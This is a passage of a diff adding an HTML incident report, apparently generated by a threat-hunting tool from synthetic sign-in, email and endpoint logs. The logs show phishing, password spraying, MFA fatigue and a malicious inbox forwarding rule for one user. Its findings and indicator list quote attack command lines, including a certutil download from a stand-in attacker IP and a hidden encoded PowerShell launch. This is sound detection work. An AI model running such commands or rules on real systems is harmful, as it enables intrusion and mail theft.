@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:">
+<meta name="generator" content="HunterScope 0.1.0">
+<title>Incident dossier: user jkowalski</title>
+<style>
+:root {
+  color-scheme: light;
+  --surface: #fcfcfb; --surface-2: #f5f4f1; --line: #e4e3de;
+  --ink: #0b0b0b; --ink-2: #52514e; --ink-3: #6b6a65;
+  --series: #2a78d6; --series-track: #cde2fb;
+  --critical: #d03b3b; --high: #ec835a; --medium: #fab219; --low: #7a7974; --info: #a8a7a2;
+  --sans: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:where(:not([data-theme="light"])) {
+    color-scheme: dark;
+    --surface: #1a1a19; --surface-2: #222221; --line: #34342f;
+    --ink: #ffffff; --ink-2: #c3c2b7; --ink-3: #9d9c93;
+    --series: #3987e5; --series-track: #0d366b;
+    --low: #9d9c93; --info: #6b6a66;
+  }
+}
+:root[data-theme="dark"] {
+  color-scheme: dark;
+  --surface: #1a1a19; --surface-2: #222221; --line: #34342f;
+  --ink: #ffffff; --ink-2: #c3c2b7; --ink-3: #9d9c93;
+  --series: #3987e5; --series-track: #0d366b;
+  --low: #9d9c93; --info: #6b6a66;
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: var(--surface); color: var(--ink); font: 15px/1.5 var(--sans); }
+main { max-width: 1120px; margin: 0 auto; padding: 32px 16px 64px; }
+h1 { font-size: 24px; margin: 0 0 4px; font-weight: 650; letter-spacing: -0.01em; }
+h2 { font-size: 13px; margin: 40px 0 12px; font-weight: 650; text-transform: uppercase; letter-spacing: 0.06em; color: var(--ink-2); }
+h3 { font-size: 16px; margin: 0; font-weight: 600; }
+a { color: var(--series); text-underline-offset: 2px; }
+code, .mono { font-family: var(--mono); font-size: 13px; overflow-wrap: anywhere; }
+.muted { color: var(--ink-2); }
+.small { font-size: 13px; }
+.sub { color: var(--ink-2); margin: 0; }
+.meta { display: flex; flex-wrap: wrap; gap: 4px 24px; margin-top: 8px; color: var(--ink-2); font-size: 13px; }
+.meta b { color: var(--ink); font-weight: 600; }
+
+/* severity: status color + glyph + label, never color alone */
+.sev-critical { --sev: var(--critical); } .sev-high { --sev: var(--high); } .sev-medium { --sev: var(--medium); }
+.sev-low { --sev: var(--low); } .sev-info { --sev: var(--info); }
+.chip { display: inline-flex; align-items: center; gap: 6px; padding: 1px 8px; border: 1px solid var(--line); border-radius: 999px;
+  font-size: 12px; font-weight: 600; letter-spacing: 0.03em; white-space: nowrap; background: var(--surface); }
+.chip .g { color: var(--sev); font-size: 11px; }
+.chip.plain { font-weight: 500; letter-spacing: 0; color: var(--ink-2); }
+.chip.flag { border-color: var(--ink-2); color: var(--ink); }
+
+/* hero figure + meter */
+.hero { display: grid; grid-template-columns: minmax(260px, 340px) 1fr; gap: 24px; margin-top: 24px; align-items: stretch; }
+.card { background: var(--surface-2); border: 1px solid var(--line); border-radius: 12px; padding: 20px; }
+.hero-fig { font-size: 64px; line-height: 1; font-weight: 650; letter-spacing: -0.03em; }
+.hero-fig small { font-size: 20px; font-weight: 500; color: var(--ink-2); letter-spacing: 0; }
+.meter { height: 10px; border-radius: 999px; margin: 14px 0 10px;
+  background: color-mix(in srgb, var(--sev) 24%, var(--surface-2)); overflow: hidden; }
+.meter > i { display: block; height: 100%; background: var(--sev); border-radius: 999px; }
+.kpis { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 12px; align-content: start; }
+.kpi { background: var(--surface-2); border: 1px solid var(--line); border-radius: 12px; padding: 14px 16px; }
+.kpi .v { font-size: 30px; font-weight: 650; line-height: 1.1; letter-spacing: -0.02em; }
+.kpi .l { color: var(--ink-2); font-size: 13px; margin-top: 2px; }
+
+/* tactic strip */
+.chain { display: flex; flex-wrap: wrap; gap: 6px; }
+.chain .step { padding: 4px 10px; border-radius: 8px; border: 1px solid var(--line); font-size: 13px; color: var(--ink-3); }
+.chain .step.on { border-color: var(--ink); color: var(--ink); font-weight: 600; background: var(--surface-2); }
+.chain .step.on::before { content: "\2713\00a0"; }
+
+/* tables */
+.tw { overflow-x: auto; border: 1px solid var(--line); border-radius: 12px; }
+table { border-collapse: collapse; width: 100%; font-size: 13px; }
+th { text-align: left; font-weight: 600; color: var(--ink-2); padding: 8px 12px; border-bottom: 1px solid var(--line); white-space: nowrap; background: var(--surface-2); }
+td { padding: 8px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
+tr:last-child td { border-bottom: 0; }
+td.nw { white-space: nowrap; }
+td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
+.barcell { display: flex; align-items: center; gap: 10px; min-width: 160px; }
+.bar { flex: 1; height: 8px; background: var(--series-track); border-radius: 4px; }
+.bar > i { display: block; height: 100%; background: var(--series); border-radius: 0 4px 4px 0; }
+tr.flagged td:first-child { box-shadow: inset 3px 0 0 var(--ink); }
+
+/* findings */
+.finding { background: var(--surface-2); border: 1px solid var(--line); border-radius: 12px; padding: 16px 20px; margin-bottom: 14px; break-inside: avoid; }
+.finding header { display: flex; flex-wrap: wrap; gap: 8px 12px; align-items: center; margin-bottom: 6px; }
+.finding .when { color: var(--ink-2); font-size: 13px; }
+.finding p { margin: 6px 0 12px; overflow-wrap: anywhere; }
+.finding .tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+.finding .tw { background: var(--surface); }
+.empty { color: var(--ink-2); padding: 12px 0; }
+.ioc { margin: 0 0 8px; }
+.ioc dt { font-weight: 600; font-size: 13px; color: var(--ink-2); margin-top: 10px; }
+.ioc dd { margin: 4px 0 0; display: flex; flex-wrap: wrap; gap: 6px; }
+.ioc code { background: var(--surface-2); border: 1px solid var(--line); border-radius: 6px; padding: 2px 8px; }
+footer { margin-top: 48px; padding-top: 16px; border-top: 1px solid var(--line); color: var(--ink-3); font-size: 12px; }
+
+@media (max-width: 720px) {
+  .hero { grid-template-columns: 1fr; }
+  .hero-fig { font-size: 52px; }
+  main { padding-top: 20px; }
+}
+@media print {
+  :root { color-scheme: light; }
+  body { font-size: 11px; }
+  main { padding: 0; max-width: none; }
+  .meter, .bar, .bar > i, .meter > i, .chip, .card, .kpi, .finding, th { print-color-adjust: exact; -webkit-print-color-adjust: exact; }
+  .tw { overflow: visible; }
+  h2 { break-after: avoid; }
+}
+</style>
+</head>
+<body>
+<main>
+<h1>Incident dossier</h1>
+<p class="sub">User <code>jkowalski</code></p>
+<div class="meta">
+  <span>Window (UTC) <b>2026-03-10 10:40:00</b> → <b>2026-03-11 10:40:00</b></span>
+  <span>Sources <b>entra 15, email 1, ual 2, windows 4</b></span>
+</div>
+
+<section class="hero" aria-label="Risk summary">
+  <div class="card sev-critical">
+    <div class="small muted">Risk score</div>
+    <div class="hero-fig">100<small> / 100</small></div>
+    <div class="meter" role="meter" aria-valuemin="0" aria-valuemax="100" aria-valuenow="100" aria-label="Risk score 100 of 100"><i style="width: 100%"></i></div>
+    <span class="chip sev-critical"><span class="g" aria-hidden="true">◆</span>CRITICAL</span>
+  </div>
+  <div class="kpis">
+    <div class="kpi"><div class="v">10</div><div class="l">Findings</div></div>
+    <div class="kpi"><div class="v">5</div><div class="l">ATT&amp;CK tactics</div></div>
+    <div class="kpi"><div class="v">22</div><div class="l">Events analysed</div></div>
+    <div class="kpi"><div class="v">10</div><div class="l">Indicators</div></div>
+  </div>
+</section>
+
+<h2>Tactics observed</h2>
+<div class="chain" role="list">
+<span class="step on" role="listitem">initial-access <span class="small muted">(3)</span></span><span class="step on" role="listitem">execution <span class="small muted">(3)</span></span><span class="step on" role="listitem">persistence <span class="small muted">(1)</span></span><span class="step" role="listitem">privilege-escalation</span><span class="step" role="listitem">defense-evasion</span><span class="step on" role="listitem">credential-access <span class="small muted">(2)</span></span><span class="step" role="listitem">discovery</span><span class="step" role="listitem">lateral-movement</span><span class="step on" role="listitem">collection <span class="small muted">(1)</span></span><span class="step" role="listitem">command-and-control</span><span class="step" role="listitem">exfiltration</span><span class="step" role="listitem">impact</span></div>
+
+<h2>Why this score</h2>
+<div class="tw"><table>
+  <thead><tr><th>Rule</th><th>Tactic</th><th class="num">Hits</th><th>Points</th></tr></thead>
+  <tbody>
+  <tr>
+    <td><code>phish_then_new_signin</code></td><td>initial-access</td><td class="num">1</td>
+    <td><div class="barcell" title="30 points"><div class="bar"><i style="width: 100.0%"></i></div><span class="num">30</span></div></td>
+  </tr>
+  <tr>
+    <td><code>failures_then_success</code></td><td>credential-access</td><td class="num">1</td>
+    <td><div class="barcell" title="30 points"><div class="bar"><i style="width: 100.0%"></i></div><span class="num">30</span></div></td>
+  </tr>
+  <tr>
+    <td><code>mfa_fatigue</code></td><td>credential-access</td><td class="num">1</td>
+    <td><div class="barcell" title="30 points"><div class="bar"><i style="width: 100.0%"></i></div><span class="num">30</span></div></td>
+  </tr>
+  <tr>
+    <td><code>suspicious_inbox_rule</code></td><td>collection</td><td class="num">1</td>
+    <td><div class="barcell" title="30 points"><div class="bar"><i style="width: 100.0%"></i></div><span class="num">30</span></div></td>
+  </tr>
+  <tr>
+    <td><code>lotl_commandline</code></td><td>execution</td><td class="num">3</td>
+    <td><div class="barcell" title="30 points"><div class="bar"><i style="width: 100.0%"></i></div><span class="num">30</span></div></td>
+  </tr>
+  <tr>
+    <td><code>impossible_travel</code></td><td>initial-access</td><td class="num">1</td>
+    <td><div class="barcell" title="25 points"><div class="bar"><i style="width: 83.3%"></i></div><span class="num">25</span></div></td>
+  </tr>
+  <tr>
+    <td><code>suspicious_email</code></td><td>initial-access</td><td class="num">1</td>
+    <td><div class="barcell" title="25 points"><div class="bar"><i style="width: 83.3%"></i></div><span class="num">25</span></div></td>
+  </tr>
+  <tr>
+    <td><code>oauth_consent</code></td><td>persistence</td><td class="num">1</td>
+    <td><div class="barcell" title="20 points"><div class="bar"><i style="width: 66.7%"></i></div><span class="num">20</span></div></td>
+  </tr>
+  <tr><td><em>multi-stage bonus</em><div class="small muted">multi-stage activity across 5 tactics: collection, credential-access, execution, initial-access, persistence</div></td><td></td><td></td>
+    <td><div class="barcell" title="20 points"><div class="bar"><i style="width: 66.7%"></i></div><span class="num">20</span></div></td></tr>
+  </tbody>
+</table></div>
+<p class="small muted">Repeat hits of one rule count 25%, one rule is capped at twice its weight, the total at 100.</p>
+
+<h2>Findings</h2>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Impossible travel between successful sign-ins</h3><span class="when">2026-03-11 07:40:00 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">initial-access</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1078/" rel="noopener noreferrer">T1078</a>  </div>
+  <p>Warsaw, PL -&gt; Sao Paulo, BR: 10660 km in 122 min (~5264 km/h, limit 900).</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 07:40:00</td><td>entra</td><td>signin</td><td>success</td><td class="mono nw">192.0.2.10</td><td class="mono">Office 365 Exchange Online · Warsaw, PL · err 0 · Other.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:41:30</td><td>entra</td><td>signin</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 0 · Other.</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Suspicious email: [Action required] Your password expires today - verify now</h3><span class="when">2026-03-11 08:50:12 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">initial-access</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1566/001/" rel="noopener noreferrer">T1566.001</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1566/002/" rel="noopener noreferrer">T1566.002</a>  </div>
+  <p>SPF fail; DMARC fail; sender helpdesk@c0ntoso-support.test imitates contoso.com; display name shows contoso.com but sender is helpdesk@c0ntoso-support.test; risky attachment invoice_0311.html; link to raw IP 198.51.100.200; link text shows contoso.com but points to 198.51.100.200; Reply-To collector@mail-drop.test differs from sender; Return-Path bounce@mailer.example.invalid differs from sender; lure keywords in subject (verify, expires, password, action required).</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 08:50:12</td><td>email</td><td>email_received</td><td>success</td><td class="mono nw">198.51.100.200</td><td class="mono">[Action required] Your password expires today - verify now · from helpdesk@c0ntoso-support.test · spf=fail/dkim=none/dmarc=fail</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Possible account takeover after suspicious email</h3><span class="when">2026-03-11 08:50:12 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">initial-access</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1566/" rel="noopener noreferrer">T1566</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1078/" rel="noopener noreferrer">T1078</a>  </div>
+  <p>Sign-in from previously unseen IP 203.0.113.50 (Sao Paulo, BR) 51 min after the suspicious email &#39;[Action required] Your password expires today - verify now&#39;.</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 08:50:12</td><td>email</td><td>email_received</td><td>success</td><td class="mono nw">198.51.100.200</td><td class="mono">[Action required] Your password expires today - verify now · from helpdesk@c0ntoso-support.test · spf=fail/dkim=none/dmarc=fail</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:41:30</td><td>entra</td><td>signin</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 0 · Other.</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Brute force / password spraying succeeded</h3><span class="when">2026-03-11 09:20:10 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">credential-access</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1110/" rel="noopener noreferrer">T1110</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1078/" rel="noopener noreferrer">T1078</a>  </div>
+  <p>7 failed credential attempts from 203.0.113.50 within 30 min, then a successful authentication.</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 09:20:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:21:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:22:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:23:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:24:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:25:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:26:10</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:41:30</td><td>entra</td><td>signin</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 0 · Other.</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>MFA fatigue: repeated denied prompts followed by success</h3><span class="when">2026-03-11 09:28:05 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">credential-access</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1621/" rel="noopener noreferrer">T1621</a>  </div>
+  <p>6 failed/denied MFA prompts within 20 min, then the sign-in was approved.</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 09:28:05</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:30:05</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:32:05</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:34:05</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:36:05</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:38:05</td><td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td></tr>
+    <tr><td class="mono nw">2026-03-11 09:41:30</td><td>entra</td><td>signin</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 0 · Other.</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Suspicious mailbox rule (New-InboxRule)</h3><span class="when">2026-03-11 09:55:12 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">collection</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1114/003/" rel="noopener noreferrer">T1114.003</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1564/008/" rel="noopener noreferrer">T1564.008</a>  </div>
+  <p>ForwardTo external address archive.collector@mail-drop.test; deletes matching messages; matches sensitive keywords (invoice, payment).</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 09:55:12</td><td>ual</td><td>New-InboxRule</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Name=.; ForwardTo=archive.collector@mail-drop.test; DeleteMessage=True; SubjectContainsWords=invoice;payment</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>OAuth consent granted to &#39;PDF Converter Pro&#39;</h3><span class="when">2026-03-11 09:58:40 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">persistence</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1528/" rel="noopener noreferrer">T1528</a>  </div>
+  <p>Scopes: Mail.ReadWrite, offline_access, User.Read. High-risk: Mail.ReadWrite, offline_access.</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 09:58:40</td><td>ual</td><td>Consent to application.</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">AppName=PDF Converter Pro; Scope=Mail.ReadWrite offline_access User.Read</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Suspicious command line: Encoded PowerShell</h3><span class="when">2026-03-11 10:30:05 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">execution</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1059/" rel="noopener noreferrer">T1059</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1059/001/" rel="noopener noreferrer">T1059.001</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1027/" rel="noopener noreferrer">T1027</a>  </div>
+  <p>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe on WS-JKOWALSKI.contoso.com ran: powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAaAB1AG4AdABlAHIAcwBjAG8AcABlACAAcwBhAG0AcABsAGUAJwA=</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 10:30:05</td><td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAaAB1AG4AdABlAHIAcwBjAG8AcABlACAAcwBhAG0AcABsAGUAJwA=</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Suspicious command line: Privilege discovery (whoami)</h3><span class="when">2026-03-11 10:31:12 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">execution</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1059/" rel="noopener noreferrer">T1059</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1033/" rel="noopener noreferrer">T1033</a>  </div>
+  <p>C:\Windows\System32\whoami.exe on WS-JKOWALSKI.contoso.com ran: whoami /priv</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 10:31:12</td><td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">whoami /priv</td></tr>
+    </tbody>
+  </table></div>
+</article>
+<article class="finding">
+  <header><span class="chip sev-high"><span class="g" aria-hidden="true">▲</span>HIGH</span><h3>Suspicious command line: certutil download/decode</h3><span class="when">2026-03-11 10:33:47 UTC</span></header>
+  <div class="tags">
+    <span class="chip plain">execution</span>
+<a class="chip plain" href="https://attack.mitre.org/techniques/T1059/" rel="noopener noreferrer">T1059</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1105/" rel="noopener noreferrer">T1105</a><a class="chip plain" href="https://attack.mitre.org/techniques/T1140/" rel="noopener noreferrer">T1140</a>  </div>
+  <p>C:\Windows\System32\certutil.exe on WS-JKOWALSKI.contoso.com ran: certutil.exe -urlcache -split -f http://203.0.113.50/p.bin C:\Users\Public\p.bin</p>
+  <div class="tw"><table>
+    <thead><tr><th>Time (UTC)</th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+    <tbody>
+    <tr><td class="mono nw">2026-03-11 10:33:47</td><td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">certutil.exe -urlcache -split -f http://203.0.113.50/p.bin C:\Users\Public\p.bin</td></tr>
+    </tbody>
+  </table></div>
+</article>
+
+<h2>Indicators of compromise</h2>
+<dl class="ioc">
+  <dt>command</dt><dd><code>certutil.exe -urlcache -split -f http://203.0.113.50/p.bin C:\Users\Public\p.bin</code><code>powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAaAB1AG4AdABlAHIAcwBjAG8AcABlACAAcwBhAG0AcABsAGUAJwA=</code><code>whoami /priv</code></dd>
+  <dt>email</dt><dd><code>archive.collector@mail-drop.test</code></dd>
+  <dt>ip</dt><dd><code>198.51.100.200</code><code>203.0.113.50</code></dd>
+  <dt>oauth_app</dt><dd><code>PDF Converter Pro</code></dd>
+  <dt>sender</dt><dd><code>helpdesk@c0ntoso-support.test</code></dd>
+  <dt>sha256</dt><dd><code>2329df5ad634e598833f6c4f6ed677325738d57d656aca0dea43c17cc2d7e443</code></dd>
+  <dt>url</dt><dd><code>hxxp://198[.]51[.]100[.]200/login</code></dd>
+</dl>
+
+<h2>Timeline</h2>
+<p class="small muted">Rows marked <span class="chip flag">⚑ flagged</span> are evidence for at least one finding.</p>
+<div class="tw"><table>
+  <thead><tr><th>Time (UTC)</th><th></th><th>Source</th><th>Action</th><th>Outcome</th><th>IP</th><th>Detail</th></tr></thead>
+  <tbody>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 07:40:00</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>success</td><td class="mono nw">192.0.2.10</td><td class="mono">Office 365 Exchange Online · Warsaw, PL · err 0 · Other.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 08:50:12</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>email</td><td>email_received</td><td>success</td><td class="mono nw">198.51.100.200</td><td class="mono">[Action required] Your password expires today - verify now · from helpdesk@c0ntoso-support.test · spf=fail/dkim=none/dmarc=fail</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:20:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:21:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:22:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:23:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:24:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:25:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:26:10</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 50126 · Invalid username or password or Invalid on-premise username or password.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:28:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td>
+  </tr>
